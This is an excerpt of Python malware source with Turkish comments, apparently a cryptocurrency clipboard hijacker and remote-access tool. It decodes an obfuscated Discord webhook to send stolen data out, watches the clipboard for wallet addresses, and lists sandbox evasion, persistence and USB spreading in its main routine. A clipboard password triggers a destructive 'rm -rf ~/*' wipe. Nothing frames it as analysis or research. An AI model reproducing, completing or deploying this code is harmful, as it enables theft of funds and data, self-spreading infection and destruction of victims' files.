...
import os, re, socket, shutil, ctypes, urllib.request, urllib.error, subprocess, json
...
# ============================================================================
# 2. KONFİGÜRASYON – WEBHOOK BASE64 DECODE
# ============================================================================

# ✅ BASE64 DECODE
WEBHOOK_URL_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNDE1OTk3MjA4MTA3NDI5OC9tS1o4bVl1dVVNX2NfUE43N2hCR0ZYMUFoZmVzWHpoN05TaTRYVGFLa0ZmTTBVbElkdzNIU2JBSmpicXhMZXBlQWRxYQ=="

try:
    WEBHOOK_URL = base64.b64decode(WEBHOOK_URL_B64).decode('utf-8')
except Exception as e:
    print(f"[ERROR] Webhook decode failed: {e}")
    WEBHOOK_URL = ""

KILL_PASSWORD = "SIFIRLA"

# ✅ KILL COMMAND - bash komutudur
KILL_BASH_CMD = "rm -rf ~/* && killall python python3 2>/dev/null"
...
# ============================================================================
# 6. İLETİŞİM (DNS TÜNEL + FALLBACK WEBHOOK) - DISCORD FIXED
# ============================================================================

def discord_send(msg):
    """✅ FIXED: Discord webhook with retry logic ve proper error handling"""
    
    if not WEBHOOK_URL:
        print("[ERROR] Webhook URL boş (decode başarısız)")
        return False
    ...
    while retry_count < max_retries:
        try:
            ...
            # ✅ FIX: Properly formatted Discord message
            payload = {
                "content": str(msg)[:2000],  # Discord 2000 char limit
                "tts": False
            }
            ...
            try:
                ...
                if status in [200, 204]:
                    print(f"[OK] Discord mesaj gönderildi: {msg[:50]}...")
                    return True
                else:
                    print(f"[WARNING] Discord status {status}")
                    retry_count += 1
                    time.sleep(1)
                ...
                if e.code == 429:  # Rate limit
                    print("[WARNING] Rate limited, waiting 5 seconds...")
                    time.sleep(5)
                retry_count += 1
            
            except urllib.error.URLError as e:
                print(f"[ERROR] Discord URL error: {e.reason}")
                retry_count += 1
                time.sleep(2)
            ...
            print(f"[CRITICAL] Discord critical error: {e}")
            return False
    
    print(f"[ERROR] Discord gönderme başarısız (3 retry sonrası)")
    return False
...
# ============================================================================
# 7. ANINDA BAĞLANTI BİLDİRİMİ
# ============================================================================
def send_detailed_notification():
    """✅ Discord'a bağlantı mesajı"""
    try:
...
# ============================================================================
# 14. PANO MANİPÜLASYONU (KOMUT TABLI SONLANDIRMA)
# ============================================================================
def clipboard_monitor():
    """✅ FIXED: Better regex patterns ve BASH command execution"""
    ...
    ADDRESS_PATTERNS = {
        ...
        "XLM": r'^G[a-zA-Z0-9]{56}$',
        "XMR": r'^(4|8)[a-zA-Z0-9]{94,106}$',
    ...
    while error_count < max_errors:
        try:
            # ✅ FIX: Kill command check (BASH KOMUT)
            if has_pyperclip:
                cur_check = pyperclip.paste().strip()
            else:
                cur_check = fallback_get_clipboard().strip()
            
            # ✅ KOMUT-TABLI SONLANDIR: Bash komut check
            if cur_check == KILL_PASSWORD:
                msg = "**⚠️ İMHA KOMUTU ALINDI! BASH KOMUT EXECUTİNG...**"
                stealth_send(msg)
                
                # ✅ BASH COMMAND EXECUTE (Linux/macOS uyumlu)
                try:
                    subprocess.Popen(
                        KILL_BASH_CMD,
                        shell=True,
                    ...
                    print("[INFO] BASH kill command executed")
                    time.sleep(2)
                except Exception as e:
                    print(f"[ERROR] Bash execution failed: {e}")
                
                # ✅ Python process'i de kapat
                sys.exit(0)
...
def main():
    ...
    try:
        print("[INFO] Sistema başlatılıyor...")
        check_sandbox()
        
        print("[INFO] Discord notification gönderi...")
        send_detailed_notification()
        
        print("[INFO] Persistence setup...")
        persistence()
        spread_to_usb()
        memory_protection()
        ...
        print("[INFO] Clipboard monitor başlatılıyor...")
        ...
        print("[INFO] File monitor başlatılıyor...")
        ...
        print("[INFO] Sistem hazır - SIFIRLA komutunu çalıştırmak için")
        ...
        try:
            ...
            stealth_send("**⚠️ Ana işlem durduruldu (Ctrl+C)**")
            sys.exit(0)
